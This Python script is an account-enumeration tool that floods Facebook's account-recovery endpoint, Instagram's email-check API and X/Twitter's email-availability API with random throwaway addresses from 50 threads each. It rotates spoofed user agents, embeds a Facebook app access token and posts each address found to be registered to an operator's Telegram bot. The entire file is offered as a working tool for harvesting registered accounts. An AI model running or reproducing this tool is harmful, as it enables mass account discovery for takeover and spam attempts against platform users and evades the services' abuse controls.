import requests, random, os, sys, string, json, threading
from threading import Thread
import secrets
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
import time

#----------------</colors>----------------#
R = "\033[1;91m"     # Red Bold
P = "\033[1;95m"     # Pink Bold  
C = "\033[1;96m"     # Cyan Bold
B = "\033[1;94m"     # Blue Bold
W = "\033[1;97m"     # White Bold
G = "\033[1;92m"     # Green Bold
Y = "\033[1;93m"     # Yellow Bold
RS = "\033[0m"       # Reset

# الألوان الجديدة
RED = "\033[1;38;5;196m"      # Red Bright
ORANGE = "\033[1;38;5;208m"    # Orange
GOLD = "\033[1;38;5;220m"      # Gold
PURPLE = "\033[1;38;5;129m"    # Purple
MAGENTA = "\033[1;38;5;201m"   # Magenta
TEAL = "\033[1;38;5;37m"       # Teal
LIME = "\033[1;38;5;154m"      # Lime Green
CORAL = "\033[1;38;5;209m"     # Coral
AQUA = "\033[1;38;5;51m"       # Aqua
HOTPINK = "\033[1;38;5;205m"   # Hot Pink
CYAN = "\033[1;38;5;51m"       # Cyan
WHITE = "\033[1;38;5;231m"     # White
GRAY = "\033[1;38;5;245m"      # Gray

#----------------</global counters>----------------#
GOOD = 0
BAND = 0
lock = threading.Lock()

#----------------</user-agent>----------------#
def TEMO_USER_AGENT():
    USER_AGENTS = [
        "[FBAN/Orca-Android;FBAV/344.0.0.48.82;FBBV/207383667;FBDM/{density=2.2,width=1080,height=2400};FBLC/zh_CN;FBRV/499578156;FBCR/Ting;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A510M;FBSV/5.5.3;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/412.0.0.51.88;FBBV/649317480;FBDM/{density=1.8,width=1080,height=2560};FBLC/es_ES;FBRV/856047248;FBCR/Freedom Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A013M;FBSV/10.1.4;FBOP/1;FBCA/arm64-v8a:;]",
        "[FBAN/FB4A;FBAV/344.0.0.40.100;FBBV/112689343;FBDM/{density=2.2,width=720,height=2340};FBLC/fa_IR;FBRV/352131634;FBCR/SouthernLINC Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F900U;FBSV/10.1.3;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/267.0.0.57.147;FBBV/459100543;FBDM/{density=1.0,width=720,height=2340};FBLC/fr_FR;FBRV/978891622;FBCR/Visible;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107M;FBSV/10.2.4;FBOP/1;FBCA/arm64-v8a:;]",
        "[FBAN/Orca-Android;FBAV/433.0.0.63.86;FBBV/403528994;FBDM/{density=1.8,width=1080,height=2560};FBLC/de_DE;FBRV/728620887;FBCR/SouthernLINC Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-J510H;FBSV/10.5.4;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/Orca-Android;FBAV/450.0.0.54.92;FBBV/830336504;FBDM/{density=1.0,width=720,height=2340};FBLC/ru_RU;FBRV/839986660;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-J510H;FBSV/7.5.4;FBOP/1;FBCA/arm64-v8a:;]"
    ]
    return random.choice(USER_AGENTS)

#----------------</functions>----------------#
def linex():
    print(f"{AQUA}{'='*50}{RS}")

def clearx():
    os.system('cls' if os.name == 'nt' else 'clear')

#----------------</logo>----------------#
def print_logo():
    logo = f"""{HOTPINK}
    ⫷SF⫸SF | @SF7SF0{GOLD}
    
░██████╗███████╗
██╔════╝██╔════╝
╚█████╗░█████╗░░
░╚═══██╗██╔══╝░░
██████╔╝██║░░░░░
╚═════╝░╚═╝░░░░░ {TEAL}
    {RS}"""
    print(logo)
    linex()

#----------------</random-email>----------------#
def random_chr_email():
    li = random.choice([4, 5, 6, 7, 8])
    domains = ["@telegmail.com", "@yopmail.com", "@SF7SF0"]
    domain = random.choice(domains)
    lifas = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890') for _ in range(li))
    email = lifas + domain
    return email

def random_twitter_email():
    aa = 'abcdefghijklmnopqrstuvwxyz1234567890'
    elia = ''.join(random.choice(aa) for _ in range(4))
    email = f'{elia}@yopmail.com'
    return email

#----------------</display counter>----------------#
def display_counter(platform):
    with lock:
        sys.stdout.write(f"\r{PURPLE}[{LIME}+{RS}{PURPLE}]{LIME} SF {PURPLE}| {LIME}{platform} {PURPLE}| {RED}HIT:{LIME}{GOOD} {PURPLE}| {GRAY}BAD:{LIME}{BAND}{RS}")
        sys.stdout.flush()

#----------------</facebook>----------------#
def facebook_worker():
    global GOOD, BAND
    session = requests.Session()
    
    while True:
        try:
            email = random_chr_email()
            headers = {
                'Host': 'b-graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                'X-Fb-Friendly-Name': 'accountRecoverySearch',
                'Authorization': 'OAuth null',
                'User-Agent': TEMO_USER_AGENT(),
                'X-Fb-Sim-Hni': '41805',
                'X-Fb-Device-Group': '3338',
                'X-Fb-Connection-Quality': 'EXCELLENT',
                'X-Fb-Net-Hni': '41805',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Connection-Type': 'WIFI',
                'Priority': 'u=3,i',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Connection': 'close',
            }
            
            data = f"q={email}&friend_name=&qs=&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&machine_id=&sfdid=a6ca2f76-0995-4db7-9083-667fc42d836d&fdid=d15ef240-9126-44ab-9574-049eb0802d8c&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            
            response = session.post('https://b-graph.facebook.com/recover_accounts', headers=headers, data=data, timeout=5)
            
            with lock:
                if "network_info" in response.text:
                    GOOD += 1
                    try:
                        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=FACEBOOK HIT%0AEMAIL: {email}', timeout=2)
                    except:
                        pass
                else:
                    BAND += 1
                    
            display_counter("FACEBOOK")
            
        except:
            with lock:
                BAND += 1
            display_counter("FACEBOOK")

def facebook_ran():
    global GOOD, BAND
    GOOD, BAND = 0, 0
    clearx()
    print_logo()
    linex()
    print(f"{TEAL}[{ORANGE}!{TEAL}] {ORANGE}STARTING FACEBOOK CHECKER WITH 50 THREADS{RS}")
    linex()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(facebook_worker)

#----------------</instagram>----------------#
def insta_worker():
    global GOOD, BAND
    session = requests.Session()
    
    while True:
        try:
            email = random_chr_email()
            url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
            headers = {
                'X-Csrftoken': secrets.token_hex(16),
                'User-Agent': generate_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/signup/email/',
                'Connection': 'close',
            }
            data = {'email': email}
            
            response = session.post(url, headers=headers, data=data, timeout=5).text
            
            with lock:
                if "email_is_taken" in response:
                    GOOD += 1
                    try:
                        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=INSTAGRAM HIT%0AEMAIL: {email}', timeout=2)
                    except:
                        pass
                else:
                    BAND += 1
                    
            display_counter("INSTAGRAM")
            
        except:
            with lock:
                BAND += 1
            display_counter("INSTAGRAM")

def insta_ran():
    global GOOD, BAND
    GOOD, BAND = 0, 0
    clearx()
    print_logo()
    linex()
    print(f"{TEAL}[{ORANGE}!{TEAL}] {ORANGE}STARTING INSTAGRAM CHECKER WITH 50 THREADS{RS}")
    linex()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(insta_worker)

#----------------</twitter>----------------#
def twitter_worker():
    global GOOD, BAND
    session = requests.Session()
    
    while True:
        try:
            email = random_twitter_email()
            url = 'https://api.x.com/i/users/email_available.json'
            headers = {
                'user-agent': generate_user_agent(),
                'Connection': 'close',
            }
            params = {
                'email': email,
            }
            
            response = session.get(url, params=params, headers=headers, timeout=5)
            data = response.json()
            
            with lock:
                if data.get('taken') == True:
                    GOOD += 1
                    try:
                        message = f"TWITTER ACCOUNT FOUND%0A%0AEMAIL: {email}%0A%0A"
                        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={message}', timeout=2)
                    except:
                        pass
                else:
                    BAND += 1
                    
            display_counter("TWITTER")
            
        except Exception:
            with lock:
                BAND += 1
            display_counter("TWITTER")

def twitter_ran():
    global GOOD, BAND
    GOOD, BAND = 0, 0
    clearx()
    print_logo()
    linex()
    print(f"{TEAL}[{ORANGE}!{TEAL}] {ORANGE}STARTING TWITTER CHECKER WITH 50 THREADS{RS}")
    linex()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(twitter_worker)

#----------------</tik-tok>----------------#
def tik_took_ran():
    clearx()
    print_logo()
    linex()
    print(f"{TEAL}[{ORANGE}!{TEAL}] {ORANGE}TIKTOK MODULE IN DEVELOPMENT{RS}")
    linex()
    time.sleep(2)

#----------------</menu>----------------#
def menu():
    global TOKEN, ID
    
    while True:
        clearx()
        print_logo()
        linex()
        print(f"{TEAL}[{ORANGE}1{TEAL}] {ORANGE}FACEBOOK {TEAL}[{ORANGE}50 THREADS{TEAL}]")
        print(f"{TEAL}[{ORANGE}2{TEAL}] {ORANGE}INSTAGRAM {TEAL}[{ORANGE}50 THREADS{TEAL}]")
        print(f"{TEAL}[{ORANGE}3{TEAL}] {ORANGE}TWITTER {TEAL}[{ORANGE}50 THREADS{TEAL}]")
        print(f"{TEAL}[{ORANGE}4{TEAL}] {ORANGE}TIKTOK {TEAL}[{ORANGE}MODULE{TEAL}]")
        print(f"{TEAL}[{ORANGE}5{TEAL}] {ORANGE}EXIT")
        linex()
        
        opten = input(f"{TEAL}[{ORANGE}?{TEAL}] {ORANGE}SELECT OPTION: {RS}")
        
        if opten == "1":
            facebook_ran()
        elif opten == "2":
            insta_ran()
        elif opten == "3":
            twitter_ran()
        elif opten == "4":
            tik_took_ran()
        elif opten == "5":
            clearx()
            print(f"{TEAL}[{ORANGE}!{TEAL}] {ORANGE}GOODBYE{RS}")
            sys.exit()
        else:
            continue

#----------------</start>----------------#
if __name__ == "__main__":
    clearx()
    print_logo()
    linex()
    
    TOKEN = input(f"{TEAL}[{ORANGE}+{TEAL}] {ORANGE}BOT TOKEN: {RS}")
    ID = input(f"{TEAL}[{ORANGE}+{TEAL}] {ORANGE}CHAT ID: {RS}")
    
    menu()